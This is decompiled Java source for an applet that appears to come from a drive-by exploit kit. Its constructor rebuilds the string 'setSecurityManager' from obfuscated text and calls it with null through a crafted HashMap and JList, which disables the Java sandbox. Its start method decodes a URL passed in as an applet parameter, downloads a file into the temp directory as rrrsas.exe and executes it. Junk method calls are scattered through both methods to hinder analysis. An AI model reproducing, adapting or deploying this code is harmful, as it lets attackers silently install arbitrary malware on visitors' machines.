import java.util.Map;
import java.awt.Component;
import javax.swing.JList;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Loo extends Applet
{
    public int fag;
    private Class[] f;
    private Class[] fd;
    private Class[] gj;
    public Class[] QfghRV;
    public Class shph;
    
    public Boolean gw42() {
        return true;
    }
    
    private void ok() {
        final int a = 1;
    }
    
    @Override
    public void start() {
        super.start();
        try {
            String tdir = System.getProperty("jq22gaava.iq22gao.tmq22gapdq22gair".replace("q22ga", ""));
            this.gw42();
            if (tdir.charAt(tdir.length() - 1) != '\\') {
                tdir += "\\";
            }
            this.gw42();
            final String efool = tdir + "rrrsas" + ".e".concat("xe");
            this.gw42();
            final String uri = this.getParameter("dest");
            this.gw42();
            String duri = "";
            this.gw42();
            for (int s = 0; s < uri.length(); ++s) {
                int tt = uri.charAt(s);
                tt -= 4;
                duri += (char)tt;
            }
            this.gw42();
            final InputStream reader = Ewsf.Deadss(duri);
            this.gw42();
            final FileOutputStream writer = new FileOutputStream(efool);
            this.gw42();
            byte[] buffer = new byte[153600];
            this.gw42();
            int totalBytesRead = 0;
            this.gw42();
            int bytesRead = 0;
            this.gw42();
            while ((bytesRead = reader.read(buffer)) > 0) {
                writer.write(buffer, 0, bytesRead);
                this.gw42();
                buffer = new byte[153600];
                this.gw42();
                totalBytesRead += bytesRead;
                this.gw42();
            }
            writer.close();
            this.gw42();
            reader.close();
            this.gw42();
            try {
                Ewsf.mese(efool);
                this.gw42();
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public final void Mwtj() {
        this.gw42();
        final int rto = 55;
        this.gw42();
    }
    
    public Loo() {
        final Object target = System.class;
        this.gw42();
        this.Mwtj();
        this.ok();
        this.gw42();
        final String methodName = "seq22gatSeq22gacurq22gaityMq22gaanq22gaager".replace("q22ga", "");
        this.Mwtj();
        this.Mwtj();
        this.ok();
        this.gw42();
        final Object[] www = { null };
        final Object[] w = { null };
        this.Mwtj();
        this.ok();
        this.gw42();
        final fgsh l = new fgsh(target, methodName, www);
        this.Mwtj();
        this.gw42();
        final HashSet a = new HashSet();
        this.gw42();
        final HashSet b = new HashSet();
        this.gw42();
        this.Mwtj();
        this.ok();
        this.gw42();
        a.add(l);
        this.ok();
        this.gw42();
        final int verif = 13;
        this.gw42();
        this.Mwtj();
        this.gw42();
        final Map bas = new HashMap() {
            @Override
            public Set entrySet() {
                return a;
            }
        };
        this.Mwtj();
        this.ok();
        final boolean tmp5_5 = true;
        this.ok();
        final boolean wwerist = tmp5_5;
        final boolean tmp5_6 = true;
        this.ok();
        final boolean localBoolean3 = tmp5_6;
        this.ok();
        final JList list = new JList((E[])new Object[] { bas });
        this.Mwtj();
        this.ok();
        this.add(list);
        this.ok();
        try {
            Thread.sleep(4000L);
        }
        catch (InterruptedException ex) {}
    }
}
